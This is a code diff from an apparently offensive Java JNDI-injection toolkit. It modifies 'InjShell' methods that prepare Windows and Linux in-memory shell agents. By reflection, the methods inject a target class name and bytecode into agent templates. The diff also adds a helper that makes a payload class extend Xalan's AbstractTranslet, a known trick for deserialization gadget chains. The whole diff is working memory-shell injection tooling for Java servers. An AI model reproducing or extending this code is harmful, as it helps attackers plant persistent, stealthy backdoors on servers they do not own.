@@ -8,7 +8,6 @@ import java.lang.reflect.Field;
 import java.util.Arrays;
 import java.util.List;
 
-import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
 import static com.nu1r.jndi.template.shell.MemShellPayloads.*;
 import static com.nu1r.jndi.utils.Config.*;
 
@@ -152,10 +151,21 @@ public class InjShell {
     }
 
     public static String insertWinAgent(CtClass ctClass) throws Exception {
-        byte[] bytes        = ctClass.toBytecode();
-        String className    = ctClass.getName();
-        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
-        Field  WinClassName = ctClazz.getDeclaredField("className");
+
+        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
+        classes.add(ctClass.getSuperclass());
+
+        String className = null;
+        for (CtClass value : classes) {
+            className = value.getName();
+            if (KEY_METHOD_MAP.containsKey(className)) {
+                break;
+            }
+        }
+
+        byte[]   bytes        = ctClass.toBytecode();
+        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
+        Field    WinClassName = ctClazz.getDeclaredField("className");
         WinClassName.setAccessible(true);
         WinClassName.set(ctClazz, className);
         Field WinclassBody = ctClazz.getDeclaredField("classBody");
@@ -165,10 +175,20 @@ public class InjShell {
     }
 
     public static void TinsertWinAgent(CtClass ctClass) throws Exception {
-        byte[] bytes        = ctClass.toBytecode();
-        String className    = ctClass.getName();
-        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
-        Field  WinClassName = ctClazz.getDeclaredField("className");
+        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
+        classes.add(ctClass.getSuperclass());
+
+        String className = null;
+        for (CtClass value : classes) {
+            className = value.getName();
+            if (KEY_METHOD_MAP.containsKey(className)) {
+                break;
+            }
+        }
+
+        byte[]   bytes        = ctClass.toBytecode();
+        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.WinMenshell");
+        Field    WinClassName = ctClazz.getDeclaredField("className");
         WinClassName.setAccessible(true);
         WinClassName.set(ctClazz, className);
         Field WinclassBody = ctClazz.getDeclaredField("classBody");
@@ -177,10 +197,19 @@ public class InjShell {
     }
 
     public static String insertLinAgent(CtClass ctClass) throws Exception {
-        byte[] bytes        = ctClass.toBytecode();
-        String className    = ctClass.getName();
-        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
-        Field  LinClassName = ctClazz.getDeclaredField("className");
+        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
+        classes.add(ctClass.getSuperclass());
+
+        String className = null;
+        for (CtClass value : classes) {
+            className = value.getName();
+            if (KEY_METHOD_MAP.containsKey(className)) {
+                break;
+            }
+        }
+        byte[]   bytes        = ctClass.toBytecode();
+        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
+        Field    LinClassName = ctClazz.getDeclaredField("className");
         LinClassName.setAccessible(true);
         LinClassName.set(ctClazz, className);
         Field LinclassBody = ctClazz.getDeclaredField("classBody");
@@ -190,14 +219,33 @@ public class InjShell {
     }
 
     public static void TinsertLinAgent(CtClass ctClass) throws Exception {
-        byte[] bytes        = ctClass.toBytecode();
-        String className    = ctClass.getName();
-        Class  ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
-        Field  LinClassName = ctClazz.getDeclaredField("className");
+        List<CtClass> classes = new java.util.ArrayList<>(Arrays.asList(ctClass.getInterfaces()));
+        classes.add(ctClass.getSuperclass());
+
+        String className = null;
+        for (CtClass value : classes) {
+            className = value.getName();
+            if (KEY_METHOD_MAP.containsKey(className)) {
+                break;
+            }
+        }
+        byte[]   bytes        = ctClass.toBytecode();
+        Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Agent.LinMenshell");
+        Field    LinClassName = ctClazz.getDeclaredField("className");
         LinClassName.setAccessible(true);
         LinClassName.set(ctClazz, className);
         Field LinclassBody = ctClazz.getDeclaredField("classBody");
         LinclassBody.setAccessible(true);
         LinclassBody.set(ctClazz, bytes);
+    }
+
+    public static void exAbstract(CtClass ctClass) throws Exception {
+        if (IS_INHERIT_ABSTRACT_TRANSLET) {
+            Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
+            ClassPool pool = ClassPool.getDefault();
+            pool.insertClassPath(new ClassClassPath(abstTranslet));
+            CtClass superClass = pool.get(abstTranslet.getName());
+            ctClass.setSuperclass(superClass);
+        }
     }
 }
